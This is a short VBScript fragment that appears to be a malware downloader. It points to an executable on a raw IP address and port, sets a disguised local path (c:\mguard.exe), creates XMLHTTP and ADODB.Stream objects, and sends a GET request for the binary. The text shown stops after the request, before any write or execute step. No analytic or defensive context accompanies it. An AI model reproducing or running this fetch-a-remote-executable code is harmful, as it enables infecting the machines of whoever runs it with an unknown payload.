dim HTTPGET
dim Data
dim ExeURL
dim LocalPath

ExeURL = "http://86.106.51.224:8431/18661_netapi.exe"
LocalPath = "c:\mguard.exe"

Set HTTPGET = CreateObject("Microsoft.XMLHTTP")
Set Data = CreateObject("ADODB.Stream")

HTTPGET.Open "GET", ExeURL, false
HTTPGET.Send
